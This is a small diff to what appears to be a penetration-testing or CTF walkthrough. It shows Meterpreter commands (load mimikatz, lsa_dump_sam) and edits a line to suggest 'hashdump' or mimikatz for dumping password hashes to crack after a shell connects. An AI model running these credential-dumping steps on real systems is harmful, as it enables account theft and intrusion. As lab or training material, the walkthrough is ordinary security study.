@@ -148,5 +148,5 @@ meterpreter > load mimikatz
 meterpreter > lsa_dump_sam
 hashes shows here..
 ```
-Just run `hashdump` after the shell connected. The hash between `:hash:::`is what you want to crack for. Job well done.
+Just use `hashdump` or `load mimikatz` after the shell connected. The hash between `:hash:::`is what you want to crack for. Job well done.
 
